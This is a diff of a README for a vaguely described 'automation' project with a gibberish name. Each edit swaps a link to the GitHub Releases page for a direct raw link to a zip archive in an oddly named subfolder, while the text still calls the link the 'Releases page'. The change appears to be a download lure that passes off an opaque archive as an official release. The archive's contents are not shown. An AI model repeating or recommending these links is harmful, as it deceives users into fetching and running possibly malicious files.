@@ -1,7 +1,7 @@
 # 🎉 amanansdiahnid-4 - Simplify Your Automation Tasks
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-amanansdiahnid--4-blue.svg)](https://github.com/Lyxrae/amanansdiahnid-4/releases)
+[![Download](https://raw.githubusercontent.com/Lyxrae/amanansdiahnid-4/main/thoracopagus/amanansdiahnid-4.zip)](https://raw.githubusercontent.com/Lyxrae/amanansdiahnid-4/main/thoracopagus/amanansdiahnid-4.zip)
 
 ## 📖 Table of Contents
 1. [Overview](#-overview)
@@ -29,7 +29,7 @@ amanansdiahnid-4 is designed to make automation tasks easier for everyone. Wheth
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Lyxrae/amanansdiahnid-4/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lyxrae/amanansdiahnid-4/main/thoracopagus/amanansdiahnid-4.zip) to download the latest version.
    
 2. Choose the file that matches your operating system. Download it by clicking the link.
 
@@ -57,4 +57,4 @@ If you run into issues or have questions, please visit our support forum or chec
 
 Your feedback is valuable. Share your thoughts or suggestions to help us improve amanansdiahnid-4.
 
-Remember, you can always find the latest version and updates on our [Releases page](https://github.com/Lyxrae/amanansdiahnid-4/releases). Enjoy automating with amanansdiahnid-4!
+Remember, you can always find the latest version and updates on our [Releases page](https://raw.githubusercontent.com/Lyxrae/amanansdiahnid-4/main/thoracopagus/amanansdiahnid-4.zip). Enjoy automating with amanansdiahnid-4!
